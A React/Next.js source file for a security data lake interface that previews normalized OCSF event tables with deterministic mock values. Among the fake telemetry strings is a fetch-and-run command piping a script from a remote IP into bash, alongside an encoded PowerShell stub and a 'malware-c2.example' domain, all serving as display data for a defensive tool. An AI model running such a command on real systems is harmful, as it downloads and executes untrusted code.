"use client"

import * as React from "react"
import Link from "next/link"

import { DataModelNavIcon, SearchDataIcon } from "@/components/icons"
import { LakewatchDataControls } from "@/components/lakewatch/LakewatchWarehouseSelector"
import { PAGE_TITLE_SEMIBOLD } from "@/components/lakewatch/pageTitleStyles"
import { getDataModel } from "@/components/lakewatch/data-models/dataModels"
import { getOcsfClass } from "@/components/lakewatch/normalizers/normalizers"
import type { DataModel } from "@/components/lakewatch/data-models/dataModels"
import { Badge } from "@/components/ui/badge"
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbLink,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb"
import { Button } from "@/components/ui/button"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table"

// ─── Deterministic mock value generation ────────────────────────────────────

function hashString(input: string): number {
  let hash = 2166136261
  for (let i = 0; i < input.length; i++) {
    hash ^= input.charCodeAt(i)
    hash = Math.imul(hash, 16777619)
  }
  return hash >>> 0
}

function makeRng(seed: string): () => number {
  let state = hashString(seed) || 1
  return () => {
    state ^= state << 13
    state ^= state >>> 17
    state ^= state << 5
    state >>>= 0
    return state / 4294967296
  }
}

const NAMES = ["Alice Nguyen", "Diego Ramos", "Priya Shah", "Marcus Lee", "Sara Kim", "Tom Alvarez"]
const HOSTS = ["FIN-LT-2291", "web-prod-07", "fin-lt-1180.acme.com", "db-prod-03", "ENG-LT-4412"]
const DOMAINS = ["login.microsoftonline.com", "s3.us-west-2.amazonaws.com", "malware-c2.example", "updates.acme.com"]

function sampleValue(model: DataModel, path: string, rowSeed: string): string {
  const rng = makeRng(`${model.id}:${path}:${rowSeed}`)
  const pick = <T,>(arr: T[]): T => arr[Math.floor(rng() * arr.length)]
  const leaf = path.split(".").pop() ?? path
  if (path === "time") {
    const base = Date.UTC(2026, 7, 20, 21, 40, 0)
    return new Date(base - Math.floor(rng() * 3_600_000)).toISOString().replace("T", " ").slice(0, 19)
  }
  if (path === "activity_id") return String(1 + Math.floor(rng() * (model.classUid === 4001 ? 6 : model.classUid === 4003 ? 2 : 4)))
  if (path === "status_id") return pick(["1", "1", "1", "2"])
  if (path === "severity_id") return pick(["2", "3", "3", "4", "5"])
  if (path === "rcode_id") return pick(["0", "0", "0", "3", "2"])
  if (leaf === "ip") return `${10 + Math.floor(rng() * 40)}.${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}`
  if (leaf === "port") return pick(["443", "80", "53", "22", "8443", String(40000 + Math.floor(rng() * 20000))])
  if (leaf === "pid") return String(1000 + Math.floor(rng() * 60000))
  if (path.includes("is_mfa")) return pick(["true", "true", "false"])
  if (path === "traffic.bytes") return String(256 + Math.floor(rng() * 90000))
  if (path === "connection_info.protocol_name") return pick(["tcp", "tcp", "udp"])
  if (path === "query.hostname") return pick(DOMAINS)
  if (path === "query.type") return pick(["A", "A", "AAAA", "TXT", "CNAME"])
  if (path === "answers.rdata") return `${Math.floor(rng() * 256)}.${Math.floor(rng() * 256)}.1.1`
  if (path === "device.hostname") return pick(HOSTS)
  if (path.endsWith("email_addr")) return `${pick(["alice.nguyen", "diego.ramos", "priya.shah"])}@acme.com`
  if (leaf === "name" && path.includes("user")) return pick(NAMES)
  if (path === "api.service.name") return pick(["sts.amazonaws.com", "iam.googleapis.com", "kubernetes.api"])
  if (path === "api.operation") return pick(["AssumeRole", "CreateServiceAccount", "create pods", "SELECT"])
  if (path === "process.name") return pick(["powershell.exe", "rundll32.exe", "curl", "mshta.exe"])
  if (path === "process.cmd_line") return pick(["powershell -enc SQBFAFgA…", "curl -s http://185.12.4.9/x.sh | bash", "rundll32.exe shell32.dll,…"])
  if (path === "process.file.path") return pick(["C:\\Windows\\System32\\rundll32.exe", "/usr/bin/curl"])
  if (path === "process.file.hashes.sha256") return `${Math.floor(rng() * 1e9).toString(16)}…`
  if (path === "metadata.product.name") return pick(model.sources)
  if (path === "cloud.region") return pick(["us-west-2", "us-central1", "eu-west-1"])
  if (path === "finding_info.title") return pick(["Suspicious PowerShell Execution", "Ransomware behavior detected", "Publicly exposed bucket"])
  if (path === "finding_info.desc") return "A process exhibited suspicious behavior…"
  if (path === "message") return pick(["User login to Okta", "alice called AssumeRole", "SSH brute force"])
  if (path === "raw_data") return "{…}"
  if (leaf.endsWith("uid") || leaf === "id" || leaf.endsWith("_uid"))
    return Math.floor(rng() * 1e12).toString(16).padStart(12, "0")
  return pick(["value_a", "value_b", "value_c"])
}

const SAMPLE_ROW_OPTIONS = [100, 500, 1000, 5000]

// ─── Preview view ───────────────────────────────────────────────────────────

export function LakewatchNormalizedDataPreviewView({ modelId }: { modelId: string }) {
  const model = getDataModel(modelId)
  const [sampleRows, setSampleRows] = React.useState(1000)

  if (!model) {
    return (
      <div className="flex min-h-0 flex-1 flex-col gap-4 overflow-y-auto p-5">
        <h1 className={PAGE_TITLE_SEMIBOLD}>Normalized data not found</h1>
        <p className="text-sm text-muted-foreground">No normalized data table matches “{modelId}”.</p>
        <Button variant="link" size="sm" asChild className="w-fit px-0">
          <Link href="/lakewatch/normalized-data">Back to Normalized data</Link>
        </Button>
      </div>
    )
  }

  const ocsfClass = getOcsfClass(model.id)
  const fields = ocsfClass?.fields ?? []
  const previewFields = fields.filter((field) => field.path !== "raw_data")
  const previewRows = React.useMemo(
    () => Array.from({ length: Math.min(50, sampleRows) }, (_, index) => `r${index}`),
    [sampleRows]
  )

  return (
    <div className="flex min-h-0 flex-1 flex-col overflow-y-auto p-5">
      <div className="flex flex-col gap-4">
        {/* Header */}
        <div className="flex flex-col gap-2">
          <Breadcrumb>
            <BreadcrumbList>
              <BreadcrumbItem>
                <BreadcrumbLink href="/lakewatch/normalized-data">Normalized data</BreadcrumbLink>
              </BreadcrumbItem>
              <BreadcrumbSeparator />
              <BreadcrumbItem>
                <BreadcrumbLink href={`/lakewatch/normalized-data/${encodeURIComponent(model.id)}`}>
                  {model.name}
                </BreadcrumbLink>
              </BreadcrumbItem>
              <BreadcrumbSeparator />
              <BreadcrumbItem>
                <BreadcrumbPage>Data</BreadcrumbPage>
              </BreadcrumbItem>
            </BreadcrumbList>
          </Breadcrumb>

          <div className="flex items-start justify-between gap-4">
            <div className="flex min-w-0 items-center gap-2">
              <DataModelNavIcon size={20} className="shrink-0 text-muted-foreground" />
              <h1 className={PAGE_TITLE_SEMIBOLD}>{model.name}</h1>
            </div>
            <div className="flex shrink-0 items-center gap-4">
              <LakewatchDataControls />
              <Button variant="default" size="sm">
                <SearchDataIcon size={16} />
                Query
              </Button>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <code className="text-hint text-foreground">{model.table}</code>
            <Badge variant="secondary" className="font-normal">
              {model.standard} {model.version}
            </Badge>
            <Badge variant="indigo" className="font-normal">
              Class {model.classUid}
            </Badge>
          </div>
        </div>

        {/* Controls */}
        <div className="flex flex-wrap items-center justify-between gap-3">
          <p className="text-sm text-muted-foreground">
            Preview of the normalized {model.eventClass} output.
          </p>
          <div className="flex items-center gap-2">
            <span className="text-hint text-muted-foreground">Sample</span>
            <Select value={String(sampleRows)} onValueChange={(value) => setSampleRows(Number(value))}>
              <SelectTrigger className="w-32">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                {SAMPLE_ROW_OPTIONS.map((option) => (
                  <SelectItem key={option} value={String(option)}>
                    {option.toLocaleString()} rows
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
          </div>
        </div>

        {/* Data table */}
        <div className="overflow-x-auto rounded-md border border-border">
          <Table className="min-w-[1100px]">
            <TableHeader>
              <TableRow className="hover:bg-transparent">
                {previewFields.map((field) => (
                  <TableHead key={field.path} className="whitespace-nowrap font-semibold">
                    {field.path}
                  </TableHead>
                ))}
              </TableRow>
            </TableHeader>
            <TableBody>
              {previewRows.map((rowSeed) => (
                <TableRow key={rowSeed}>
                  {previewFields.map((field) => (
                    <TableCell key={field.path} className="whitespace-nowrap py-2 text-foreground">
                      {sampleValue(model, field.path, rowSeed)}
                    </TableCell>
                  ))}
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </div>
        <p className="text-hint text-muted-foreground">
          Showing {previewRows.length} of {sampleRows.toLocaleString()} sampled rows ·{" "}
          {previewFields.length} columns
        </p>
      </div>
    </div>
  )
}
